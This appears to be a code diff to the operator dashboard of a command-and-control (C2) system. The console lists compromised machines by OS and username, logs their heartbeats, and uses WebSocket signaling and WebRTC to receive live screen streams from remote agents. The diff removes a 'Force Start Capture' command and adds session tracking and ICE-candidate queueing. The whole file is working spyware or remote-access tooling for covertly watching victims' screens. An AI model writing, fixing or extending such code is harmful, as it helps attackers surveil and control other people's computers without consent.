@@ -24,29 +24,11 @@
             align-items: center;
             flex-direction: column;
         }
-        #videoContainer {
-            position: relative;
+        #videoModal video {
             width: 80%;
-            max-width: 1280px;
+            max-height: 80%;
             background: #000;
             border: 2px solid #3b82f6;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        #remoteVideo {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        #statusOverlay {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: rgba(0,0,0,0.7);
-            padding: 5px 10px;
-            border-radius: 4px;
-            font-size: 12px;
-            color: #fff;
         }
         #closeVideo {
             position: absolute;
@@ -77,20 +59,6 @@
         .status-connecting { background-color: #fbbf24; }
 
         .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
-        
-        #forceStartBtn {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #f59e0b;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            border-radius: 4px;
-            z-index: 1002;
-        }
     </style>
 </head>
 <body>
@@ -107,11 +75,7 @@
     <!-- Video Modal -->
     <div id="videoModal">
         <button id="closeVideo" onclick="closeVideo()">Close</button>
-        <div id="videoContainer">
-            <div id="statusOverlay">Connecting...</div>
-            <video id="remoteVideo" autoplay playsinline muted></video>
-        </div>
-        <button id="forceStartBtn" onclick="forceStartCapture()">Force Start Capture</button>
+        <video id="remoteVideo" autoplay playsinline></video>
     </div>
 
     <script>
@@ -125,7 +89,6 @@
         // Store sessions by ID to avoid conflicts
         let sessions = {};
         const remoteVideo = document.getElementById('remoteVideo');
-        const statusOverlay = document.getElementById('statusOverlay');
 
         ws.onopen = () => {
             console.log("Admin connected to C2");
@@ -145,8 +108,9 @@
                     addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                 }
                 else if (data.type === 'info') {
-                    addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');
+                    addLog(`🟢 New User: ${data.os || 'Unknown'} / ${data.user || 'Unknown'}`, 'green');
                     
+                    // FIX: Prevent duplicates/spam
                     if (!users[data.id]) {
                         users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now(), sessionActive: false };
                     } else {
@@ -186,10 +150,13 @@
                     addLog(`[SIG] Received Candidate from ${data.targetId}`, 'blue');
                     handleWebRTCCandidate(data.candidate, data.targetId);
                 }
-                else if (data.type === 'capture_ready') {
-                    addLog(`[READY] ${data.id} is ready to stream!`, 'green');
-                    statusOverlay.innerText = "Stream Active";
-                    statusOverlay.style.color = "#4ade80";
+                else if (data.type === 'session_active') {
+                    if (users[data.agentId]) {
+                        users[data.agentId].sessionActive = true;
+                        users[data.agentId].status = 'Online';
+                        renderUsers();
+                        addLog(`[SESSION] Active session established with ${data.agentId}`, 'green');
+                    }
                 }
                 else {
                     if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
@@ -214,20 +181,15 @@
                     pc: new RTCPeerConnection({
                         iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                     }),
-                    candidates: []
+                    candidates: [] // Queue for early candidates
                 };
 
                 const pc = sessions[targetId].pc;
 
                 pc.ontrack = (event) => {
-                    // If there's already a stream, remove it first to avoid conflicts
-                    if (remoteVideo.srcObject) {
-                        remoteVideo.srcObject.getTracks().forEach(track => track.stop());
-                    }
                     remoteVideo.srcObject = event.streams[0];
-                    statusOverlay.innerText = "Streaming Live";
-                    statusOverlay.style.color = "#4ade80";
                     addLog(`[VIDEO] Stream received from ${targetId}`, 'green');
+                    document.getElementById('videoModal').style.display = 'flex';
                 };
 
                 pc.onicecandidate = (event) => {
@@ -247,6 +209,10 @@
                         closeSession(targetId);
                     }
                 };
+
+                pc.onicegatheringstatechange = () => {
+                    addLog(`[ICE] Gathering: ${pc.iceGatheringState} for ${targetId}`, 'blue');
+                };
             }
             return sessions[targetId];
         }
@@ -258,6 +224,7 @@
             try {
                 await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
 
+                // Apply any queued candidates now that we have the remote description
                 while (session.candidates.length > 0) {
                     const candidate = session.candidates.shift();
                     await pc.addIceCandidate(new RTCIceCandidate(candidate));
@@ -273,13 +240,6 @@
                 }));
 
                 addLog(`[SIG] Answer sent to ${targetId}`, 'green');
-                
-                // Request the agent to start sending video NOW
-                ws.send(JSON.stringify({
-                    type: 'request_stream',
-                    targetId: targetId
-                }));
-
             } catch (err) {
                 addLog(`[WEBRTC] Error handling offer: ${err.message}`, 'red');
             }
@@ -287,10 +247,13 @@
 
         function handleWebRTCCandidate(candidate, targetId) {
             const session = getSession(targetId);
+
             if (session.pc.remoteDescription) {
+                // If remote description is set, add candidate immediately
                 session.pc.addIceCandidate(new RTCIceCandidate(candidate))
                     .catch(err => addLog(`[WEBRTC] Error adding candidate: ${err.message}`, 'red'));
             } else {
+                // Queue candidate if remote description is not yet set
                 session.candidates.push(candidate);
             }
         }
@@ -368,6 +331,7 @@
         }
 
         function joinUser(id, status) {
+            // If we have stored signaling data, send it back
             if (users[id] && users[id].signalingData) {
                 const sigData = users[id].signalingData;
                 ws.send(JSON.stringify({
@@ -378,6 +342,7 @@
                 }));
                 addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
             } else {
+                // Request a new join
                 ws.send(JSON.stringify({
                     type: 'request_join',
                     targetId: id,
@@ -386,6 +351,7 @@
                 addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
             }
 
+            // Visual feedback
             const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
             card.style.borderColor = '#4ade80';
             setTimeout(() => card.style.borderColor = '#3b82f6', 500);
@@ -393,28 +359,9 @@
 
         function closeVideo() {
             document.getElementById('videoModal').style.display = 'none';
+            // Close all active sessions
             Object.keys(sessions).forEach(sid => closeSession(sid));
             remoteVideo.srcObject = null;
-            statusOverlay.innerText = "Disconnected";
-            statusOverlay.style.color = "#fff";
-        }
-
-        function forceStartCapture() {
-            // Find the currently active session (the one in the modal)
-            const currentSessionKey = Object.keys(sessions).find(key => {
-                // Heuristic: The one whose video element is visible or has a stream
-                return true; 
-            });
-            
-            if (currentSessionKey) {
-                ws.send(JSON.stringify({
-                    type: 'force_stream',
-                    targetId: currentSessionKey
-                }));
-                addLog(`[ADMIN] Forced stream request to ${currentSessionKey}`, 'yellow');
-                statusOverlay.innerText = "Requesting Stream...";
-                statusOverlay.style.color = "#fbbf24";
-            }
         }
     </script>
 </body>
